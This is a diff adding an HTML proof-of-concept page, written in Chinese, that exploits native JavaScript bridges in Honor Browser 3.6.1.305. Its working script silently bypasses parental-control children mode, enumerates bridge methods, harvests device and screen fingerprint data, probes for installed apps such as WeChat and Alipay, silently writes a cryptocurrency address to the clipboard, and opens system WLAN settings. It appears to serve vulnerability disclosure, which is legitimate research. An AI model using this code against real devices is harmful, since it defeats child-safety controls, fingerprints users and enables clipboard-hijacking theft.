@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Honor Browser - PoC</title>
+<style>
+  body { font-family: monospace; max-width: 680px; margin: 40px auto; padding: 20px; }
+  .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin: 16px 0; }
+  .vuln { background: #fff3cd; border-color: #ffc107; }
+  .ok   { background: #d4edda; border-color: #28a745; }
+  button { padding: 10px 20px; margin: 4px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; }
+  .btn-go   { background: #dc3545; color: white; }
+  .btn-info { background: #6c757d; color: white; }
+  pre { background: #f5f5f5; padding: 12px; border-radius: 4px; overflow-x: auto; }
+  .log { background: #1e1e1e; color: #0f0; padding: 12px; border-radius: 4px; min-height: 80px; font-size: 13px; }
+</style>
+</head>
+<body>
+
+<h2>🔬 Honor Browser — PoC</h2>
+<p>com.honor.browser v3.6.1.305 | WebPageActivity</p>
+
+<div class="card vuln">
+  <h3>BrowserPageLoadDetector.continueToAccessChildrenMode()</h3>
+  <p>通过 JS Bridge 向 <code>hihonor.intent.action.BROWSE_APP_LIMIT</code> 发送当前页面的 host，绕过家长控制/儿童模式限制。</p>
+  <p><strong>风险等级：</strong> HIGH — 无需密码、无需用户确认、无 UI 提示</p>
+</div>
+
+<div class="card">
+  <h3>环境检测</h3>
+  <pre id="env"></pre>
+</div>
+
+<div class="card">
+  <h3>操作</h3>
+  <button class="btn-go" onclick="triggerBypass()">触发 continueToAccessChildrenMode()</button>
+  <button class="btn-info" onclick="listAllBridges()">枚举全部 JS Bridge</button>
+  <button class="btn-info" onclick="getDeviceInfo()">获取系统信息</button>
+  <button class="btn-info" onclick="getScreenInfo()">获取屏幕配置</button>
+  <button class="btn-info" onclick="getAppList()">探测已安装应用</button>
+  <button class="btn-info" onclick="copyClipboard()">静默写剪贴板</button>
+  <button class="btn-info" onclick="openWifiSettings()">打开 WLAN 设置</button>
+</div>
+
+<div class="card">
+  <h3>日志</h3>
+  <div class="log" id="log"></div>
+</div>
+
+<script>
+var logs = [];
+function log(msg) {
+  logs.push('[' + new Date().toLocaleTimeString() + '] ' + msg);
+  document.getElementById('log').textContent = logs.join('\n');
+  console.log(msg);
+}
+
+// ========== 环境检测 ==========
+(function detect() {
+  var env = [];
+  env.push('UserAgent: ' + navigator.userAgent.substring(0, 80) + '...');
+  env.push('URL: ' + window.location.href);
+
+  // 检测 JS Bridge 是否存在
+  var bridges = [];
+  try { if (typeof window.nativeBridge !== 'undefined')       bridges.push('nativeBridge ✅'); }
+       catch(e) { bridges.push('nativeBridge ❌'); }
+  try { if (typeof window.hnbrJsInterface !== 'undefined')   bridges.push('hnbrJsInterface ✅'); }
+       catch(e) { bridges.push('hnbrJsInterface ❌'); }
+  try { if (typeof window.movieModeJsBr !== 'undefined')     bridges.push('movieModeJsBr ✅'); }
+       catch(e) { bridges.push('movieModeJsBr ❌'); }
+  try { if (typeof window._dsbridge !== 'undefined')          bridges.push('_dsbridge ✅'); }
+       catch(e) { bridges.push('_dsbridge ❌'); }
+  try { if (typeof window.BrowserPageLoadDetector !== 'undefined') bridges.push('BrowserPageLoadDetector ✅'); }
+       catch(e) { bridges.push('BrowserPageLoadDetector ❌'); }
+  try { if (typeof window.webAdvJsInterface !== 'undefined') bridges.push('webAdvJsInterface ✅'); }
+       catch(e) { bridges.push('webAdvJsInterface ❌'); }
+  try { if (typeof window.hwbrScreenConfigDetector !== 'undefined') bridges.push('hwbrScreenConfigDetector ✅'); }
+       catch(e) { bridges.push('hwbrScreenConfigDetector ❌'); }
+
+  env = env.concat(bridges);
+  document.getElementById('env').textContent = env.join('\n');
+})();
+
+// ========== 核心利用 ==========
+function triggerBypass() {
+  log('>>> 调用 BrowserPageLoadDetector.continueToAccessChildrenMode()');
+
+  try {
+    if (typeof window.BrowserPageLoadDetector === 'undefined') {
+      log('❌ BrowserPageLoadDetector 不可用');
+      log('   确认在 Honor Browser WebPageActivity 中打开此页面');
+      return;
+    }
+
+    var currentHost = window.location.hostname;
+    log('当前页面 host: ' + currentHost);
+    log('发送 Intent: hihonor.intent.action.BROWSE_APP_LIMIT');
+    log('Intent extra urlPath=' + currentHost);
+
+    window.BrowserPageLoadDetector.continueToAccessChildrenMode();
+    log('✅ 调用成功 — 该域名已被加入放行列表');
+    log('⚠️  无密码验证，无用户提示，无任何 UI 反馈');
+  } catch(e) {
+    log('❌ 调用失败: ' + e.message);
+  }
+}
+
+// ========== 辅助功能（演示攻击面）==========
+function listAllBridges() {
+  log('--- 枚举 JS Bridge ---');
+  var names = ['nativeBridge','hnbrJsInterface','movieModeJsBr',
+               '_dsbridge','_dsb','BrowserPageLoadDetector',
+               'webAdvJsInterface','hwbrScreenConfigDetector'];
+  names.forEach(function(n) {
+    try {
+      var obj = eval('window.' + n);
+      if (obj !== undefined) {
+        var methods = [];
+        for (var k in obj) {
+          if (typeof obj[k] === 'function') methods.push(k);
+        }
+        log('  ' + n + ': ' + methods.join(', '));
+      }
+    } catch(e) {
+      log('  ' + n + ': error');
+    }
+  });
+}
+
+function getDeviceInfo() {
+  log('--- 获取系统信息 ---');
+  try {
+    var info = window.nativeBridge.getSystemInfo();
+    log('SystemInfo: ' + info.substring(0, 200));
+    // 解析关键字段
+    try {
+      var parsed = JSON.parse(info);
+      if (parsed.data) {
+        log('  语言: ' + parsed.data.language);
+        log('  网络: ' + parsed.data.networkStatus);
+        log('  夜间模式: ' + parsed.data.nightMode);
+        log('  设备类型: ' + parsed.data.deviceType);
+        log('  字体大小: ' + parsed.data.fontSizeScale);
+      }
+    } catch(e) {}
+  } catch(e) {
+    log('❌ ' + e.message);
+  }
+}
+
+function getScreenInfo() {
+  log('--- 获取屏幕配置 ---');
+  try {
+    var info = window.hwbrScreenConfigDetector.getScreenConfig();
+    log('ScreenConfig: ' + info);
+    try {
+      var s = JSON.parse(info);
+      log('  isFoldable: ' + s.isFoldable + ' (不可变的硬件指纹!)');
+      log('  isFoldableScreenExpanded: ' + s.isFoldableScreenExpanded);
+      log('  isMutiWin: ' + s.isMutiWin);
+      log('  isLandscape: ' + s.isLandscape);
+    } catch(e) {}
+  } catch(e) {
+    log('❌ ' + e.message);
+  }
+}
+
+function getAppList() {
+  log('--- 探测已安装应用 ---');
+  try {
+    // 常见 Honor 预装应用包名探测
+    var pkgs = '["com.honor.browser","com.hihonor.appmarket",' +
+               '"com.hihonor.health","com.hihonor.phoneservice",' +
+               '"com.tencent.mm","com.eg.android.AlipayGphone"]';
+    var result = window.nativeBridge.getAppStatus(pkgs);
+    log('AppStatus: ' + result);
+    try {
+      var apps = JSON.parse(result);
+      for (var pkg in apps) {
+        log('  ' + pkg + ': ' + apps[pkg].status +
+            (apps[pkg].version ? ' v' + apps[pkg].version : ''));
+      }
+    } catch(e) {}
+  } catch(e) {
+    log('❌ ' + e.message);
+  }
+}
+
+function copyClipboard() {
+  log('--- 静默写剪贴板 ---');
+  try {
+    window.nativeBridge.saveWebViewText('0x742d35Cc6634C0532925F1A78C4D9D4F7C6E2f3A');
+    log('✅ 已将加密货币地址写入剪贴板（无用户提示）');
+    log('⚠️  standard navigator.clipboard.writeText() 需要 secure context + user gesture');
+    log('   nativeBridge.saveWebViewText() 绕过了以上所有限制');
+  } catch(e) {
+    log('❌ ' + e.message);
+  }
+}
+
+function openWifiSettings() {
+  log('--- 打开 WLAN 设置 ---');
+  try {
+    window.BrowserPageLoadDetector.openSetNetWorkDialog();
+    log('✅ 已触发系统 WLAN 设置页面');
+    log('⚠️  可从网页直接打开系统设置 → 社会工程学攻击向量');
+  } catch(e) {
+    log('❌ ' + e.message);
+  }
+}
+</script>
+</body>
+</html>
